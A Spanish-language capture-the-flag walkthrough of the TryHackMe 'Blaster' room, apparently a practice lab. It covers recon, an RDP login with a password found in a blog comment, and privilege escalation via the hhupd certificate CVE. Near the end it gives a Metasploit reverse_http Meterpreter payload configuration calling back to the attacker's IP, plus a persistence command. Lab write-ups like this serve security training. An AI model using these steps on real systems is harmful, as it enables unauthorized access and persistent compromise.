# THM - Blue
[TryHackMe-Blaster](https://tryhackme.com/room/blaster)

Para comenzar el análisis se realiza un **nmap** a la ip de la máquina.

![Nmap](/img/blaster1.png)

*Try Hack Me*  
![THM1](/img/blaster2.png)

Al acceder a la web que se encuentra en la ip proporcionada puede verse el nombre del sitio.

![web](/img/blaster3.png)

*Try Hack Me*  
![THM2](/img/blaster4.png)

Gracias a la herramienta **Feroxbuster**, se pueden encontrar los directorios ocultos del siti web. En este caso se ha encontrado */retro*.

![retro](/img/blaster5.png)

*Try Hack Me*  
![THM3](/img/blaster6.png)

Al acceder a la web puede verse que está hecha por el usuario ***Wade***.

![retro](/img/blaster7.png)

*Try Hack Me*  
![THM4](/img/blaster8.png)

Al navegar por la página, uno de los post habla sobre "Ready Player One", película con la que el usuario se siente identificado y menciona que cada vez que hace login en la web se equivoca escribiendo el nombre del avatar del protagonista. Si se accede a este post, en el comentario aparece dicha contraseña.

*Try Hack Me*  
![THM5](/img/blaster9.png)

A continuación se va a intentar acceder al sistema con la herramienta ***xfreerdp***. 

![xfreerdp](/img/blaster10.png)

*Try Hack Me*  
![THM6](/img/blaster11.png)

En el escritorio de la máquina puede verse un programa llamado **hhupd**, el cual si lo buscamos tiene un CVE asociado.

*Try Hack Me*  
![THM7](/img/blaster14.png)

Puede buscarse un CVE asociado a este ejecutable:

![CVE](/img/blaster12.png)

*Try Hack Me*  
![THM7](/img/blaster13.png)

Al ejecutar el programa como administrador y ver el certificado del creador, se abre una página web en la que parece que da un fallo. Una vez aparezca esta página hay que guardarla, pulsando *Ok* en la alerta que saldrá en la pantalla y se guarda en la carpeta que puede verse en la imagen:

![web](/img/blaster15.png)

A continuación hay que buscar cmd en la carpeta de *System32* y al abrirlo y ejecutar *whoami* ya se habrán escalado privilegios.

![privilegios](/img/blaster16.png)

*Try Hack Me*  
![THM8](/img/blaster17.png)

Al acceder al escritorio del administrador puede verse el contenido del fichero *root.txt*.

![txt](/img/blaster18.png)

*Try Hack Me*  
![THM9](/img/blaster19.png)

A continuación se va a utilizar un nuevo *exploit* pero esta vez desde la herramienta **Mestasploit**. 

![metasploit](/img/blaster20.png)

![target](/img/blaster21.png)

*Try Hack Me*  
![THM10](/img/blaster22.png)

Configurar el *exploit*:
```
set lhost (ip vpn)
set target 2
set payload windows/meterpreter/reverse_http
run -j
```

Copiar el comando que da Metasploit y colocarlo en la línea de comandos con la que se escalaron privilegios. 

![run](/img/blaster23.png)

Una vez ejecutada, al volver a Metasploit aparecerá la línea de comandos con *Meterpreter*. Para ganar persistencia en el sistema ejecutar *run persistence -X*.

![meterpreter](/img/blaster24.png)

*Try Hack Me*  
![THM11](/img/blaster25.png)